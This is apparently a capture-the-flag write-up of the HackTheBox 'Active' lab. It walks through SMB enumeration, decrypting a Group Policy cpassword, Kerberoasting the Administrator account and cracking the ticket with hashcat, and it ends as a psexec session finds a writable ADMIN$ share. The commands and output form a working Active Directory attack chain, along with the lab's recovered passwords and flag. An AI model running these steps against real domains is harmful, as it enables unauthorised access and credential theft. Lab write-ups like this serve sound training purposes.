---
title: HackTheBox - Active WriteUp
date: 2025-07-16 15:22:00 +/-0100
categories: [Machines] 
tags: [CTF,HackTheBox, Active Directory, Kerberoasting]
image: /assets/img/Machines/Active/Active.png  # SIZE 1200:630
description: 
    This post documents my walkthrough of the Active machine from Hack The Box. It involves Active Directory enumeration, SMB share analysis, Group Policy Preference exploitation, and Kerberoasting to ultimately gain administrator access.
---

## Enumeration

### Port Scanning

As always, the first step is to perform an Nmap scan.

```bash
┌──(krakenn㉿Phoenix)-[~/CPTS/Boxes/Active/Nmap]                
└─$ sudo nmap -Pn -n -sV -sC -A -T4 10.10.10.100 -oA Default-Nmap                                                                                                                                                                          
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-16 00:37 +01    
Nmap scan report for 10.10.10.100
Host is up (0.052s latency).
Not shown: 982 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-15 23:38:05Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  tcpwrapped
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=7/16%OT=53%CT=1%CU=41127%PV=Y%DS=2%DC=T%G=Y%TM=6876E6A
OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S%TS=
OS:7)SEQ(SP=103%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS=7)SEQ(SP=104%GCD=1%ISR
OS:=10B%TI=I%CI=I%II=I%SS=S%TS=7)SEQ(SP=106%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS
OS:=S%TS=7)SEQ(SP=F9%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS=7)OPS(O1=M552NW8S
OS:T11%O2=M552NW8ST11%O3=M552NW8NNT11%O4=M552NW8ST11%O5=M552NW8ST11%O6=M552
OS:ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=
OS:80%W=2000%O=M552NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2
OS:(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80
OS:%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q
OS:=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G
OS:)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-07-15T23:39:11
|_  start_date: 2025-07-15T23:08:37

TRACEROUTE (using port 23/tcp)
HOP RTT      ADDRESS
1   51.43 ms 10.10.14.1
2   51.56 ms 10.10.10.100

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 84.11 seconds
```

**Valuable Information:**

| Port Number | Service | Version|
| -------------- | -------- | --------|
| 53/TCP | DNS | Microsoft DNS 6.1.7601 |
| 88/TCP | Kerberos | Microsoft Windows Kerberos |
| 139/TCP 445/TCP | SMB | X |
| 3268/TCP | LDAP | Microsoft Windows Active Directory LDAP |

- Operating System: Windows Server 2008 R2 Service Pack 1

- Since DNS, Kerberos, and LDAP are in use, we can conclude that the environment is based on `Active Directory`.

- Domain: `active.htb`

### Footprinting SMB

Attempting to enumerate SMB shares via anonymous access.

```bash
┌──(krakenn㉿Phoenix)-[~]
└─$ smbmap -H 10.10.10.100 -r Replication --depth 100 
[+] IP: 10.10.10.100:445        Name: 10.10.10.100              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share                                                                                                                                         
        Replication                                             READ ONLY
        ./Replication               
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    .                     
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    active.htb
        ./Replication//active.htb
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    .         
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    DfsrPrivate
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    Policies
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    scripts
        ./Replication//active.htb/DfsrPrivate
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    ConflictAndDeleted
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    Deleted
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    Installing
        ./Replication//active.htb/Policies
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    {31B2F340-016D-11D2-945F-00C04FB984F9}
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    {6AC1786C-016F-11D2-945F-00C04fB984F9}
        ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    ..
        fr--r--r--               23 Sat Jul 21 11:38:11 2018    GPT.INI
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    Group Policy
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    MACHINE
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    USER
        ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    ..
        fr--r--r--              119 Sat Jul 21 11:38:11 2018    GPE.INI
        ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    Microsoft
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    Preferences
        fr--r--r--             2788 Sat Jul 21 11:38:11 2018    Registry.pol
        ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    Windows NT
        ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    SecEdit
        ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    ..
        fr--r--r--             1098 Sat Jul 21 11:38:11 2018    GptTmpl.inf
        ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    Groups
        ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    ..
        fr--r--r--              533 Sat Jul 21 11:38:11 2018    Groups.xml
        ./Replication//active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    ..
        fr--r--r--               22 Sat Jul 21 11:38:11 2018    GPT.INI
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    MACHINE
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    USER
        ./Replication//active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    Microsoft
        ./Replication//active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    Windows NT
        ./Replication//active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    SecEdit
        ./Replication//active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 11:37:44 2018    ..
        fr--r--r--             3722 Sat Jul 21 11:38:11 2018    GptTmpl.inf
```

### Groups.xml

- During the enumeration of the SMB share, we identified the presence of a file named `Groups.xml`, which contains the username and cpasssword of a user. 

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

- **Username: `active.htb\SVC_TGS`**
- **cpassword: `edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ`**

It can be decrypted using `gpp-decrypt`:

```bash
┌──(krakenn㉿Phoenix)-[~/CPTS/Boxes/Active]
└─$ gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
GPPstillStandingStrong2k18
```

- **Password: `GPPstillStandingStrong2k18`**

We can now use these credentials to enumerate the SMB shares again.

```bash
┌──(krakenn㉿Phoenix)-[~]                                                      
└─$ smbmap -H 10.10.10.100 -u 'svc_tgs' -p 'GPPstillStandingStrong2k18'                                          
    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------        
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap
                        
[*] Detected 1 hosts serving SMB                                                     
[*] Established 1 SMB connections(s) and 1 authenticated session(s)
               
[+] IP: 10.10.10.100:445        Name: 10.10.10.100              Status: Authenticated          
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share                                                                                                                                         
        Replication                                             READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share                                                                                                                                         
        Users                                                   READ ONLY
[*] Closed 1 connections                                   
```

Proceeding to enumerate the contents of the `Users` share:

```bash
┌──(krakenn㉿Phoenix)-[~]                                                                                                                                                                                                                  
└─$ smbmap -H 10.10.10.100 -u 'svc_tgs' -p 'GPPstillStandingStrong2k18' -r Users --depth 100
    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------        
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap
               
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 1 authenticated session(s)
                                                                                  
[+] IP: 10.10.10.100:445        Name: 10.10.10.100              Status: Authenticated          
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share                                                                                                                                         
        Replication                                             READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share                                                                                                                                         
        Users                                                   READ ONLY
       
        ./Users               
        dw--w--w--                0 Sat Jul 21 15:39:20 2018    .
        dw--w--w--                0 Sat Jul 21 15:39:20 2018    ..
        dr--r--r--                0 Mon Jul 16 11:14:21 2018    Administrator
        dr--r--r--                0 Mon Jul 16 22:08:56 2018    All Users
        dw--w--w--                0 Mon Jul 16 22:08:47 2018    Default
        dr--r--r--                0 Mon Jul 16 22:08:56 2018    Default User
        fr--r--r--              174 Mon Jul 16 22:01:17 2018    desktop.ini
        dw--w--w--                0 Mon Jul 16 22:08:47 2018    Public
        dr--r--r--                0 Sat Jul 21 16:16:32 2018    SVC_TGS
        ./Users//Default
        dw--w--w--                0 Mon Jul 16 22:08:47 2018    .
        dw--w--w--                0 Mon Jul 16 22:08:47 2018    ..
        dr--r--r--                0 Mon Jul 16 22:08:47 2018    AppData
        dr--r--r--                0 Mon Jul 16 22:08:56 2018    Application Data
        dr--r--r--                0 Mon Jul 16 22:08:56 2018    Cookies

        ....
        ....
        ....

        ./Users//SVC_TGS/Desktop
        dr--r--r--                0 Sat Jul 21 16:14:42 2018    .
        dr--r--r--                0 Sat Jul 21 16:14:42 2018    ..
        fw--w--w--               34 Wed Jul 16 13:52:15 2025    user.txt
[*] Closed 1 connections                                                

```

Let’s download the user.txt file.

```bash
┌──(krakenn㉿Phoenix)-[~/CPTS/Boxes/Active]
└─$ smbmap -H 10.10.10.100 -u 'svc_tgs' -p 'GPPstillStandingStrong2k18' -s Users --download './Users//SVC_TGS/Desktop/user.txt'

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
[+] Starting download: Users\SVC_TGS\Desktop\user.txt (34 bytes)                                                         
[+] File output to: /home/krakenn/CPTS/Boxes/Active/10.10.10.100-Users_SVC_TGS_Desktop_user.txt                          
[*] Closed 1 connections                                                                                                     
                                                                                                                                                                                                                                           
┌──(krakenn㉿Phoenix)-[~/CPTS/Boxes/Active]
└─$ ls
 10.10.10.100-Replication_active.htb_Policies_{31B2F340-016D-11D2-945F-00C04FB984F9}_MACHINE_Preferences_Groups_Groups.xml               10.10.10.100-Users_SVC_TGS_Desktop_user.txt   Creds
'10.10.10.100-Replication_active.htb_Policies_{6AC1786C-016F-11D2-945F-00C04fB984F9}_MACHINE_Microsoft_Windows NT_SecEdit_GptTmpl.inf'   Administrator-TGS                             Nmap

┌──(krakenn㉿Phoenix)-[~/CPTS/Boxes/Active]
└─$ cat 10.10.10.100-Users_SVC_TGS_Desktop_user.txt 
1552882c279a0217d52873b6ef16a941

```

- **User Flag: `1552882c279a0217d52873b6ef16a941`**

## PsExec

Now, let's attempt to access the machine using PsExec with the credentials we found. Note that this will only work if the user has administrative privileges on the target system.

```bash
┌──(krakenn㉿Phoenix)-[~]
└─$ impacket-psexec active.htb/svc_tgs@10.10.10.100
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Requesting shares on 10.10.10.100.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'NETLOGON' is not writable.
[-] share 'Replication' is not writable.
[-] share 'SYSVOL' is not writable.
[-] share 'Users' is not writable.

```

- As expected, the svc_tgs user does not have administrative privileges on the target machine, so we need to find an alternative approach.

## Post Exploitation Enumeration

- As we know, any authenticated user in an Active Directory environment can query information about the domain. We can leverage this by using tools like BloodHound to enumerate domain relationships and identify potential attack paths to the Domain Controller. However, since I’m feeling a bit lazy right now, I’ll skip BloodHound on this box and instead focus on finding Kerberoastable accounts using GetUserSPNs.

```bash
┌──(krakenn㉿Phoenix)-[~]
└─$ impacket-GetUserSPNs -dc-ip 10.10.10.100 active.htb/SVC_TGS                            
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 20:06:40.351723  2025-07-16 13:52:18.056178             
```

- We discovered that the user `Administrator` is vulnerable to Kerberoasting.

## Privilege Escalation → Kerberoasting

```bash
┌──(krakenn㉿Phoenix)-[~]
└─$ impacket-GetUserSPNs -dc-ip 10.10.10.100 active.htb/SVC_TGS -request-user administrator
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 20:06:40.351723  2025-07-16 13:52:18.056178             

[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$49b5363310b16e0244c7a0ea1c8f4b94$b29d274341535580c945ff1d42b91d1eb6eb1fbe8c4ac36f78b934df3b33e0b7a68dbc0f065acf80afa88bdff51ce7b308bced84b9142d23be284e9e4e9bf272a8f2cf6a28123ca829884ad8a2e2573c5d68eb8f97bd08362ab527f4843d0fc9561db0c7dfea0342b927b004c0a4e83403bd2a0ffbe364102c7cec0a79b88fab0da0022809b741272b74ace99fe7b0487bfe04e256a9510ec6af96772533c9bdfa2b36dc0a6a13d4a9b6078811e8fb151335363eadcd25437b684c4d72e8e010dd82f22f45cc83211b3cdc72a5643924a70a22b9fa7a3dc64386f638a0005b02a73ff44a981c785ccf2b2f6cfb8c7bd42f6ea23a75855e11d47da3659b83ee15ff28b02cedb772464bea72b201d8ff921e0127e9b89e0a780ef8b0a60ef5361e66e7c116dccf7ae4a072ded4dd6fb24f9e6b0bbbf43e79233f36fd26eeb471473eac476c8a23c4f9e3faf32fd60f771cd50c1d00e196c2a288687ddcd7e98179ffa263b81a343afcb1bb2bdf37b4c2b3aecf02a724d3e40f6593cbc524a83733d10624bf2e19b92df9b929a6dc92b542829f42844ff69f1c09fc0b2f09d36dba15417322f00c48aff27b58b620752e51499fb556dedcbe6f08178ea2ae191e719a285cd41442c02fab1daf607a8d3bf57c63e3ada4331d6e3d2709f10882e88757c9d1bd7ac4a306afc91cb2d4fbe27ad7a16e6e71b73c718f3061ffa6f4853d81ef8b38258b132bad128d06c8794feb28a946f811db1b9290a7d6761578c0dd9a85eb4b81160bfb405863f55c3c1361e73acf15c7305f28ec0a2f984fbb1fdbd11bd5072afc05cd9dd38bdd1d95527cf5e68d2f043710d9e31b84379402986f8fbfd98a048443d61f0d420c329ec6992c47e09db199eab50e04a8748412d4497d3656250a1f2f04396ee372fd8910c3cd9b64e8772849cd15b4e9515d99efef01421bf4f6baca27ec0592ef471f725e181ecb39cd7fb19ba4e580c3cd1cdf7a7628e84492b2a455614a51994c408d4b72915b2fd0ac49e671222d67999e9502aa1e00197ad8a6135827c099f26d357038c05f01d08648aa577319e73e52f6f8dd47ef8d06909eb432dc7003f22ce8fd6fe8dc892af714e04c135d8d82a47bb29172767f505df8915b4466c9ebbbda355698f8b50485d9384e57d97365b3f55852090cb1cfdf64f9bd8376d5deaae57c82b8df1f78d8d1cde720cac7af171f736207067f9a037d9c34aa4161cd471ec9357080a05ffc9d3f1178
```

We’ve successfully retrieved the Ticket Granting Service (TGS) ticket for the Administrator account. We can save this hash to a file and attempt to crack it using Hashcat.

### Hash Cracking

To determine the appropriate Hashcat module, we can search online for 'Hashcat hash modes' and look for the one that matches hashes starting with `$krb5tgs$23$`. This corresponds to module `13100`

```bash
┌──(krakenn㉿Phoenix)-[~/CPTS/Boxes/Active]                      
└─$ hashcat --help | grep "TGS"             
  19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol

┌──(krakenn㉿Phoenix)-[~/CPTS/Boxes/Active]                                              
└─$ hashcat -m 13100 Administrator-TGS /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting
                                                                                                                                                                                                                                           
OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]                                                                                       
====================================================================================================================================================                                                         
* Device #1: cpu-haswell-Intel(R) Core(TM) i7-8750H CPU @ 2.20GHz, 6862/13788 MB (2048 MB allocatable), 12MCU                                                                                       
Minimum password length supported by kernel: 0                                
Maximum password length supported by kernel: 256
                                  
Hashes: 1 digests; 1 unique digests, 1 unique salts                                    
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1
                                                                                                                                                                                                                                           
Optimizers applied:                                                               
* Zero-Byte                                                             
* Not-Iterated                                                                     
* Single-Hash                                                                  
* Single-Salt                                                                   
                                                                                                                                                                                                                                           
ATTENTION! Pure (unoptimized) backend kernels selected.                       
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.
Watchdog: Temperature abort trigger set to 90c
Host memory required for this attack: 3 MB
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$49b5363310b16e0244c7a0ea1c8f4b94$b29d274341535580c945ff1d42b91d1eb6eb1fbe8c4ac36f78b934df3b33e0b7a68dbc0f065acf80afa88bdff51ce7b308bced84b9142d23be284e9e4e9bf272a8f2cf6a28123ca829884ad8a2e2573c5d68eb8f97bd08362ab527f4843d0fc9561db0c7dfea0342b927b004c0a4e83403bd2a0ffbe364102c7cec0a79b88fab0da0022809b741272b74ace99fe7b0487bfe04e256a9510ec6af96772533c9bdfa2b36dc0a6a13d4a9b6078811e8fb151335363eadcd25437b684
c4d72e8e010dd82f22f45cc83211b3cdc72a5643924a70a22b9fa7a3dc64386f638a0005b02a73ff44a981c785ccf2b2f6cfb8c7bd42f6ea23a75855e11d47da3659b83ee15ff28b02cedb772464bea72b201d8ff921e0127e9b89e0a780ef8b0a60ef5361e66e7c116dccf7ae4a072ded4dd6fb24f
9e6b0bbbf43e79233f36fd26eeb471473eac476c8a23c4f9e3faf32fd60f771cd50c1d00e196c2a288687ddcd7e98179ffa263b81a343afcb1bb2bdf37b4c2b3aecf02a724d3e40f6593cbc524a83733d10624bf2e19b92df9b929a6dc92b542829f42844ff69f1c09fc0b2f09d36dba15417322f00
c48aff27b58b620752e51499fb556dedcbe6f08178ea2ae191e719a285cd41442c02fab1daf607a8d3bf57c63e3ada4331d6e3d2709f10882e88757c9d1bd7ac4a306afc91cb2d4fbe27ad7a16e6e71b73c718f3061ffa6f4853d81ef8b38258b132bad128d06c8794feb28a946f811db1b9290a7d6
761578c0dd9a85eb4b81160bfb405863f55c3c1361e73acf15c7305f28ec0a2f984fbb1fdbd11bd5072afc05cd9dd38bdd1d95527cf5e68d2f043710d9e31b84379402986f8fbfd98a048443d61f0d420c329ec6992c47e09db199eab50e04a8748412d4497d3656250a1f2f04396ee372fd8910c3c
d9b64e8772849cd15b4e9515d99efef01421bf4f6baca27ec0592ef471f725e181ecb39cd7fb19ba4e580c3cd1cdf7a7628e84492b2a455614a51994c408d4b72915b2fd0ac49e671222d67999e9502aa1e00197ad8a6135827c099f26d357038c05f01d08648aa577319e73e52f6f8dd47ef8d0690
9eb432dc7003f22ce8fd6fe8dc892af714e04c135d8d82a47bb29172767f505df8915b4466c9ebbbda355698f8b50485d9384e57d97365b3f55852090cb1cfdf64f9bd8376d5deaae57c82b8df1f78d8d1cde720cac7af171f736207067f9a037d9c34aa4161cd471ec9357080a05ffc9d3f1178:Ticketmaster1968

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Ad...3f1178
Time.Started.....: Wed Jul 16 18:33:56 2025 (4 secs)
Time.Estimated...: Wed Jul 16 18:34:00 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) 
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  3415.9 kH/s (2.22ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10543104/14344385 (73.50%)
Rejected.........: 0/10543104 (0.00%)
Restore.Point....: 10530816/14344385 (73.41%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Tr1nity -> Teague51
Hardware.Mon.#1..: Temp: 59c Util: 48%

Started: Wed Jul 16 18:33:56 2025
Stopped: Wed Jul 16 18:34:01 2025

```

**Password: `Ticketmaster1968`**

- Now, let’s try to use PsExec, as the `Administrator` account may have administrative privileges on the target machine.
- **Note:** It’s common to find service accounts with administrative rights due to misconfigurations in many Active Directory environments.

```bash
┌──(krakenn㉿Phoenix)-[~/CPTS/Boxes/Active]
└─$ impacket-psexec active.htb/Administrator@10.10.10.100
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
